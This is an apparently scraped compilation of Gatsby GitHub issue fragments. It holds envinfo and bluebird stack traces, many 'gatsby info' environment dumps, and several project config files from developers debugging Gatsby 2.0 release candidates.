[npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:638:18 - promise_array.js:126 promisearray._resolve [npm]/[gatsby-cli]/[bluebird]/js/release/promise_array.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [npm]/[gatsby-cli]/[bluebird]/js/release/promise_array.js:144:14 - promise.js:574 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:574:26 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18 error unhandled rejection error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:7778 - envinfo.js:1 object.copysync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:104976 - envinfo.js:1 object.t.writesync.e [as writesync] [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:123499 - envinfo.js:1 [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:124274 - envinfo.js:1 promise.all.then.e [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:124289 - util.js:16 trycatcher [npm]/[gatsby-cli]/[bluebird]/js/release/util.js:16:23 - promise.js:512 promise._settlepromisefromhandler [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:512:31 - promise.js:569 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:569:18 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18 - promise.js:638 promise._fulfill [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:638:18 - promise_array.js:126 promisearray._resolve [npm]/[gatsby-cli]/[bluebird]/js/release/promise_array.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [npm]/[gatsby-cli]/[bluebird]/js/release/promise_array.js:144:14 - promise.js:574 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:574:26 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18
<details> <summary>gatsby info --clipboard</summary> system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 4.4.19 - /usr/local/bin/bash binaries: node: 10.8.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.92 firefox: 59.0.1 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.15 gatsby-plugin-feed: next => 2.0.0-rc.2 gatsby-plugin-google-analytics: next => 2.0.0-rc.2 gatsby-plugin-google-fonts: 0.0.4 => 0.0.4 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.6 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 gatsby-plugin-sass: next => 2.0.0-rc.2 gatsby-plugin-sharp: next => 2.0.0-rc.3 gatsby-remark-copy-linked-files: next => 2.0.0-rc.1 gatsby-remark-images: next => 2.0.1-rc.1 gatsby-remark-prismjs: next => 3.0.0-rc.2 gatsby-remark-responsive-iframe: next => 2.0.0-rc.1 gatsby-remark-smartypants: next => 2.0.0-rc.1 gatsby-source-filesystem: next => 2.0.1-rc.2 gatsby-source-github-api: 0.0.3 => 0.0.3 gatsby-transformer-remark: next => 2.1.1-rc.1 gatsby-transformer-sharp: next => 2.1.1-rc.3 npmglobalpackages: gatsby-cli: 1.1.58 </details>
``` system: os: macos high sierra 10.13.3 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 10.0.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 46.0.1 safari: 11.0.3 npmglobalpackages: gatsby-cli: 1.1.58
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.1 - ~/.nvm/versions/node/v8.11.1/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.3.0 - ~/.nvm/versions/node/v8.11.1/bin/npm browsers: chrome: 68.0.3440.106 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.19 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.6 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 gatsby-plugin-typography: next => 2.2.0-rc.3 npmglobalpackages: gatsby-cli: 1.1.58
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.8.0 - ~/.nvm/versions/node/v10.8.0/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.2.0 - ~/.nvm/versions/node/v10.8.0/bin/npm browsers: chrome: 69.0.3497.81 firefox: 60.0.2 safari: 11.1.2 npmglobalpackages: gatsby-cli: 1.1.58 gatsby-source-prismic: 2.0.0-alpha.3
project's gatsby packages:
[thomas@thomas-px60:failing-routes]$ yarn list | grep gatsby
gatsby-cli@2.0.0-rc.1
gatsby-link@2.0.0-rc.2
gatsby-plugin-manifest@2.0.2-rc.1
gatsby-plugin-offline@2.0.0-rc.4
gatsby-plugin-page-creator@2.0.0-rc.1
gatsby-plugin-react-helmet@3.0.0-rc.1
gatsby-react-router-scroll@2.0.0-rc.2
gatsby-source-filesystem@2.0.1-rc.1
gatsby-transformer-remark@2.1.1-rc.1
gatsby@2.0.0-rc.13
gatsby-cli@^2.0.0-rc.1
gatsby-link@^2.0.0-rc.2
gatsby-plugin-page-creator@^2.0.0-rc.1
gatsby-react-router-scroll@^2.0.0-rc.2 ``` not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli` <details> <summary>sorry <code>gatsby info</code> fails..
(click to expand)</summary> ```
thomas@thomas-px60:tmp]$ npm ls -g | grep gatsby-cli
gatsby-cli@1.1.58 [thomas@thomas-px60:tmp]$ sudo npm install -g gatsby-cli
/usr/bin/gatsby -> /usr/lib/node_modules/gatsby-cli/lib/index.js
+ gatsby-cli@1.1.58
updated 1 package in 4.202s [thomas@thomas-px60:tmp]$ gatsby --help
usage: gatsby <command> [options] commandes: gatsby develop start development server
watches files, rebuilds, and hot reloads if something changes gatsby build build a gatsby project
gatsby serve serve previously built gatsby site
gatsby info get environment information for debugging and issue reporting gatsby new [rootpath] [starter] create new gatsby project
options: --verbose turn on verbose output [bool n] [d aut: false] --no-color turn off the color in output [bool n] [d aut: false] -h, --help affiche de l'aide [bool n] -v, --version affiche le num o de version [bool n] [thomas@thomas-px60:tmp]$ gatsby info
error cannot read property '1' of null typeerror: cannot read property '1' of null - envinfo.js:1 a.run.then.e [lib]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:97255 - util.js:16 trycatcher [lib]/[gatsby-cli]/[bluebird]/js/release/util.js:16:23 - promise.js:512 promise._settlepromisefromhandler [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:512:31 - promise.js:569 promise._settlepromise [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:569:18 - promise.js:614 promise._settlepromise0 [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18 - async.js:138 _drainqueuestep [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:138:12 - async.js:131 _drainqueue [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:131:9 - async.js:147 async._drainqueues [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:147:5 - async.js:17 immediate.async.drainqueues [as _onimmediate] [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:17:14 error unhandled rejection typeerror: cannot read property '1' of null - envinfo.js:1 a.run.then.e [lib]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:97255 - util.js:16 trycatcher [lib]/[gatsby-cli]/[bluebird]/js/release/util.js:16:23 - promise.js:512 promise._settlepromisefromhandler [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:512:31 - promise.js:569 promise._settlepromise [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:569:18 - promise.js:614 promise._settlepromise0 [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [lib]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18 - async.js:138 _drainqueuestep [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:138:12 - async.js:131 _drainqueue [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:131:9 - async.js:147 async._drainqueues [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:147:5 - async.js:17 immediate.async.drainqueues [as _onimmediate] [lib]/[gatsby-cli]/[bluebird]/js/release/async.js:17:14 ``` </details>
all info can be found in the repository.
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 10.7.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.2.0 - /usr/local/bin/npm browsers: chrome: 69.0.3497.81 firefox: 61.0.2 npmpackages: gatsby: ^1.9.250 => 1.9.273 gatsby-link: ^1.6.39 => 1.6.45 gatsby-plugin-feed: ^1.3.20 => 1.3.25 gatsby-plugin-google-analytics: ^1.0.29 => 1.0.31 gatsby-plugin-offline: ^1.0.15 => 1.0.18 gatsby-plugin-react-helmet: ^1.0.8 => 1.0.8 gatsby-plugin-sharp: ^1.6.42 => 1.6.48 gatsby-plugin-typography: ^1.7.18 => 1.7.19 gatsby-remark-copy-linked-files: ^1.5.31 => 1.5.37 gatsby-remark-images: ^1.5.61 => 1.5.67 gatsby-remark-prismjs: ^1.2.24 => 1.2.24 gatsby-remark-responsive-iframe: ^1.4.18 => 1.4.20 gatsby-remark-smartypants: ^1.4.12 => 1.4.12 gatsby-source-filesystem: ^1.5.31 => 1.5.39 gatsby-transformer-remark: ^1.7.40 => 1.7.44 gatsby-transformer-sharp: ^1.6.22 => 1.6.27 npmglobalpackages: gatsby-cli: 1.1.58
``` **gatsby-config.js:**
module.exports = { sitemetadata: { title: 'hvml \xa8c hypervideo markup language', author: 'hugh guiney', description: 'documentation for hvml', siteurl: ' }, pathprefix: '/', plugins: [ { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/pages`, name: 'pages', }, }, // { // resolve: `gatsby-source-filesystem`, // options: { // path: `${__dirname}/src/layouts`, // name: 'layouts', // }, // }, { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 590, }, }, { resolve: `gatsby-remark-responsive-iframe`, options: { wrapperstyle: `margin-bottom: 1.0725rem`, }, }, 'gatsby-remark-prismjs', 'gatsby-remark-copy-linked-files', 'gatsby-remark-smartypants', ], }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-google-analytics`, options: { //trackingid: `add your tracking id here`, }, }, `gatsby-plugin-feed`, `gatsby-plugin-offline`, `gatsby-plugin-react-helmet`, { resolve: 'gatsby-plugin-typography', options: { pathtoconfigmodule: 'src/utils/typography', }, }, ],
``` for a full example you can clone the relevant [commit]( from my project, run `gatsby build`, and look at one of the many pages with code on it
the angle brackets will be rendered red instead of blue.
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.9.0 - ~/.nvm/versions/node/v10.9.0/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 6.2.0 - ~/.nvm/versions/node/v10.9.0/bin/npm browsers: chrome: 69.0.3497.81 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.10 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.2 gatsby-plugin-react-helmet: next => 3.0.0-rc.1
``` system: os: linux 4.9 debian gnu/linux 9 (stretch) 9 (stretch) cpu: x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.3.1 - /bin/zsh binaries: node: 10.7.0 - ~/.nvm/versions/node/v10.7.0/bin/node yarn: 1.9.4 - ~/.nvm/versions/node/v10.7.0/bin/yarn npm: 6.3.0 - ~/.nvm/versions/node/v10.7.0/bin/npm browsers: chrome: 68.0.3440.106 firefox: 52.9.0 npmpackages: gatsby: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-image: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-plugin-google-analytics: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-manifest: ^2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-offline: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-plugin-postcss: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-react-css-modules: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-react-helmet: ^3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-sass: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-sharp: ^2.0.0-rc.3 => 2.0.0-rc.3 gatsby-plugin-typography: ^2.2.0-rc.2 => 2.2.0-rc.2 gatsby-source-filesystem: ^2.0.1-rc.1 => 2.0.1-rc.1 gatsby-transformer-sharp: ^2.1.1-rc.2 => 2.1.1-rc.2 npmglobalpackages: gatsby: 2.0.0-beta.87 ```
``` system: os: linux 4.9 debian gnu/linux 9 (stretch) 9 (stretch) cpu: x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.3.1 - /bin/zsh binaries: node: 10.7.0 - ~/.nvm/versions/node/v10.7.0/bin/node yarn: 1.9.4 - ~/.nvm/versions/node/v10.7.0/bin/yarn npm: 6.3.0 - ~/.nvm/versions/node/v10.7.0/bin/npm browsers: chrome: 68.0.3440.106 firefox: 52.9.0 npmpackages: gatsby: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-image: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-plugin-google-analytics: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-manifest: ^2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-offline: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-plugin-postcss: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-react-css-modules: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-react-helmet: ^3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-sass: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-sharp: ^2.0.0-rc.3 => 2.0.0-rc.3 gatsby-plugin-typography: ^2.2.0-rc.2 => 2.2.0-rc.2 gatsby-source-filesystem: ^2.0.1-rc.1 => 2.0.1-rc.1 gatsby-transformer-sharp: ^2.1.1-rc.2 => 2.1.1-rc.2 npmglobalpackages: gatsby: 2.0.0-beta.87 ```
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.3 - /bin/zsh binaries: node: 10.5.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-rc.9 => 2.0.0-rc.9 gatsby-plugin-manifest: ^2.0.2-rc.0 => 2.0.2-rc.1 gatsby-plugin-offline: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-plugin-react-helmet: ^3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-remove-trailing-slashes: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-source-filesystem: ^2.0.1-rc.1 => 2.0.1-rc.1 gatsby-transformer-json: ^2.1.1-rc.1 => 2.1.1-rc.1 npmglobalpackages: gatsby-cli: 1.1.58
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.2.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.8 gatsby-plugin-emotion: next => 2.0.0-rc.1 gatsby-plugin-google-tagmanager: next => 2.0.0-rc.1 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.2 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-3470 cpu @ 3.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.2.1 - ~/.nvm/versions/node/v10.2.1/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v10.2.1/bin/npm browsers: chrome: 68.0.3440.106 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.46 gatsby-plugin-catch-links: next => 2.0.2-beta.3 gatsby-plugin-google-analytics: next => 2.0.0-beta.2 gatsby-plugin-manifest: next => 2.0.2-beta.2 gatsby-plugin-offline: next => 2.0.0-beta.3 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 gatsby-plugin-styled-components: next => 3.0.0-beta.2 gatsby-remark-images-contentful: next => 2.0.0-beta.2 gatsby-remark-smartypants: next => 2.0.0-beta.2 gatsby-source-contentful: next => 2.0.1-beta.13 gatsby-transformer-remark: next => 2.1.1-beta.3 npmglobalpackages: gatsby-cli: 2.0.0-beta.6
``` any ideas on how to fix this?
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 4.4.19 - /usr/local/bin/bash binaries: node: 10.8.0 - ~/.nodenv/shims/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.2.0 - ~/.nodenv/shims/npm browsers: chrome: 68.0.3440.106 firefox: 59.0.1 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.4 gatsby-image: next => 2.0.0-rc.1 gatsby-plugin-emotion: next => 2.0.0-rc.1 gatsby-plugin-google-fonts: next => 0.0.4 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 gatsby-plugin-sharp: next => 2.0.0-rc.2 gatsby-remark-images: next => 2.0.1-rc.1 gatsby-source-contentful: next => 2.0.1-rc.2 gatsby-source-filesystem: next => 2.0.1-rc.1 gatsby-transformer-remark: next => 2.1.1-rc.1 gatsby-transformer-sharp: next => 2.1.1-rc.2 npmglobalpackages: gatsby-cli: 2.0.0-rc.1 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: linux 4.4 ubuntu 16.04.5 lts (xenial xerus) cpu: x64 intel(r) core(tm) i5-2400 cpu @ 3.10ghz shell: 4.3.48 - /bin/bash binaries: node: 10.9.0 - ~/opt/node/latest/bin/node yarn: 1.9.4 - ~/opt/node/latest/bin/yarn npm: 6.4.1 - ~/opt/node/latest/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.1 npmpackages: gatsby: next => 2.0.0-rc.4 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.1 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: see above
`gatsby-browser.js`: see above
`gatsby-ssr.js`: n/a if given some general directions, i would be happy to contribute and make a pr for this issue.
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 4.4.23 - /usr/local/bin/bash binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 60.0.1 safari: 11.1.2 npmpackages: gatsby: ^1.9.277 => 1.9.277 gatsby-image: ^1.0.55 => 1.0.55 gatsby-link: ^1.6.46 => 1.6.46 gatsby-plugin-google-fonts: 0.0.4 => 0.0.4 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-sitemap: ^1.2.25 => 1.2.25 gatsby-plugin-styled-components: ^2.0.11 => 2.0.11 gatsby-plugin-typography: ^1.7.19 => 1.7.19 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-smartypants: ^1.4.12 => 1.4.12 gatsby-source-filesystem: ^1.5.39 => 1.5.39 gatsby-transformer-remark: ^1.7.44 => 1.7.44 gatsby-transformer-sharp: ^1.6.27 => 1.6.27 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) `gatsby-config.js`: ```
module.exports = { sitemetadata: { siteurl: ` `, title: `my site`, }, plugins: [ `gatsby-plugin-styled-components`, `gatsby-image`, `gatsby-plugin-sharp`, `gatsby-transformer-sharp`, \'gatsby-plugin-react-helmet\', `gatsby-plugin-sitemap`, { resolve: \'gatsby-plugin-robots-txt\', options: { host: ` `, sitemap: ` `, policy: [{ useragent: \'*\', allow: \'/\', disallow: [\'/pubkey/\'] }] } }, `gatsby-transformer-remark`, { resolve: `gatsby-source-filesystem`, options: { name: `content`, path: `${__dirname}/content/`, }, }, { resolve: `gatsby-plugin-google-fonts`, options: { // alternative fonts // font-family: \'lato\', sans-serif; // font-family: \'questrial\', sans-serif; // font-family: \'yantramanav\', sans-serif; // font-family: \'alegreya sans\', sans-serif; // font-family: \'quattrocento sans\', sans-serif; // font-family: \'assistant\', sans-serif; // font-family: \'scada\', sans-serif; // font-family: \'jaldi\', sans-serif; // font-family: \'archivo\', sans-serif; // font-family: \'ramabhadra\', sans-serif; // font-family: \'montserrat subrayada\', sans-serif; // font-family: \'tajawal\', sans-serif; fonts: [ `quattrocento sans`, `anonymous pro\\:300,400,400i,700` // you can also specify font weights and styles ] } }, { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: "gatsby-remark-smartypants", options: { dashes: "oldschool", backticks: false, }, }, { resolve: `gatsby-remark-images`, options: { maxwidth: 1024, linkimagestooriginal: false, wrapperstyle: "", backgroundcolor: "#000020" }, }, ], }, }, ]
``` `package.json`: ```
{ "name": "gatsby-starter-hello-world", "description": "gatsby hello world starter", "license": "mit", "scripts": { "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve" }, "dependencies": { "gatsby": "^1.9.277", "gatsby-image": "^1.0.55", "gatsby-link": "^1.6.46", "gatsby-plugin-google-fonts": "0.0.4", "gatsby-plugin-react-helmet": "^2.0.11", "gatsby-plugin-robots-txt": "^1.3.0", "gatsby-plugin-sharp": "^1.6.48", "gatsby-plugin-sitemap": "^1.2.25", "gatsby-plugin-styled-components": "^2.0.11", "gatsby-plugin-typography": "^1.7.19", "gatsby-remark-images": "^1.5.67", "gatsby-remark-smartypants": "^1.4.12", "gatsby-source-filesystem": "^1.5.39", "gatsby-transformer-remark": "^1.7.44", "gatsby-transformer-sharp": "^1.6.27", "react-helmet": "^5.2.0", "smoothscroll-polyfill": "^0.4.3", "styled-components": "^3.4.5", "typography-theme-noriega": "^0.15.10" }
``` `gatsby-node.js`: ```
const { createfilepath } = require(`gatsby-source-filesystem`);
const path = require(`path`); exports.oncreatenode = ({ node, getnode, boundactioncreators }) => { const { createnodefield } = boundactioncreators if (node.internal.type === `markdownremark`) { const slug = createfilepath({ node, getnode, basepath: `content` }) createnodefield({ node, name: `slug`, value: slug, }) }
}; exports.createpages = ({ graphql, boundactioncreators }) => { const { createpage } = boundactioncreators return new promise((resolve, reject) => { graphql(` { allmarkdownremark { edges { node { fileabsolutepath fields { slug } } } } } ` ).then(result => { result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: node.fields.slug, component: path.resolve(`./src/templates/areatemplate.js`), context: { slug: node.fields.slug }, }) }) resolve() }) }) };
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.0 - ~/.nvm/versions/node/v8.9.0/bin/node yarn: 1.9.4 - ~/.yarn/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v8.9.0/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 12.0 npmpackages: gatsby: ^2.0.0-rc.3 => 2.0.0-rc.3 gatsby-plugin-catch-links: ^2.0.2-beta.10 => 2.0.2-beta.10 gatsby-plugin-favicon: ^3.1.2 => 3.1.2 gatsby-plugin-google-analytics: next => 2.0.0-beta.5 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sass: next => 2.0.0-beta.10 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-plugin-typography: next => 2.2.0-beta.3 gatsby-remark-autolink-headers: ^1.4.18 => 1.4.19 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-copy-linked-files: next => 2.0.0-beta.3 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-smartypants: next => 2.0.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.6 npmglobalpackages: gatsby-cli: 2.0.0-beta.13
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-7500 cpu @ 3.40ghz shell: 5.3 - /bin/zsh binaries: node: 10.8.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.4.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.3 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.1 gatsby-plugin-postcss: ^1.0.0 => 1.0.0 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-beta.7 => 2.0.0-rc.0 gatsby-image: ^2.0.0-beta.2 => 2.0.0-rc.0 gatsby-plugin-emotion: ^2.0.0-beta.2 => 2.0.0-rc.0 gatsby-plugin-react-helmet: ^3.0.0-beta.2 => 3.0.0-rc.0 gatsby-plugin-sharp: ^2.0.0-beta.2 => 2.0.0-rc.0 gatsby-source-filesystem: ^2.0.1-beta.3 => 2.0.1-rc.0 gatsby-transformer-sharp: ^2.1.1-beta.3 => 2.1.1-rc.0 npmglobalpackages: gatsby-cli: 1.1.58 gatsby-dev-cli: 2.0.0-alpha.80a21f04
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-image: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-google-analytics: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-jss: ^2.0.2-rc.0 => 2.0.2-rc.0 gatsby-plugin-layout: next => 1.0.0-rc.0 gatsby-plugin-manifest: ^2.0.2-rc.0 => 2.0.2-rc.0 gatsby-plugin-offline: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-react-helmet: ^3.0.0-rc.0 => 3.0.0-rc.0 gatsby-plugin-sharp: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-typescript: ^2.0.0-rc.0 => 2.0.0-rc.1 gatsby-plugin-typography: ^2.2.0-rc.0 => 2.2.0-rc.0 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^2.0.1-rc.0 => 2.0.1-rc.0 gatsby-remark-responsive-iframe: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-source-filesystem: ^2.0.1-rc.0 => 2.0.1-rc.0 gatsby-transformer-json: ^2.1.1-rc.0 => 2.1.1-rc.0 gatsby-transformer-remark: ^2.1.1-rc.0 => 2.1.1-rc.0 gatsby-transformer-sharp: ^2.1.1-rc.0 => 2.1.1-rc.0 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a the original `gatsby-ssr.js` api started with a new `sheetsregistry` each time it rendered the page:
